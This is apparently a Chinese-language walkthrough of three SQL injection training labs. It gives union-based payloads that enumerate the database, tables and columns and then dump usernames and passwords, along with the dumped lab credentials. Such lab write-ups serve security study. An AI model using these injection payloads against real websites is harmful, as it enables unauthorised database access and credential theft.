#### lab1：字符型union注入

简单的联合注入？

payload:

测显示位：

```sql
1'union select 1,2,3%23
```

爆数据库：

```sql
-1'union select 1,database(),3%23
```

爆表名：

```sql
-1'union select 1,2,group_concat(table_name)from(information_schema.tables)where table_schema=database()%23
```

爆字段：

```sql
-1'/**/union select 1,2,group_concat(column_name)from(information_schema.columns)where/**/table_name='users'%23
```

爆用户名和密码：

```sql
-1'/**/union select 1,group_concat(username),group_concat(password) from users %23
```

```
username:
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
password:
Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```

#### lab2：整型union注入

爆表名：emails,referers,uagents,users

```sql
-1 union select 1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23
```

爆字段名：id,username,password,level

```sql
-1 union select 1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='users'%23
```

爆出用户名和密码：

```sql
-1 union select 1,group_concat(username),group_concat(password) from users%23
```



#### lab3：

初次碰壁：直接使用简单的sql注入是不行的了，后端进行了处理，通过报错回显我们可以分析，是多了一个括号，我们写入这样一个语句`-1'union select 1,2%23`，产生的回显是`your MySQL server version for the right syntax to use near 'union select 1,2#') LIMIT 0,1' at line 1`，比我们的语句多了一个括号，那么闭合括号就可以了。

爆数据库：

```sql
-1')union select 1,database(),3%23
```

爆表名：emails,referers,uagents,users

```sql
-1') union select 1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23
```

同理如lab1，lab2，使用union注入即可，只是多闭合了一个`)`

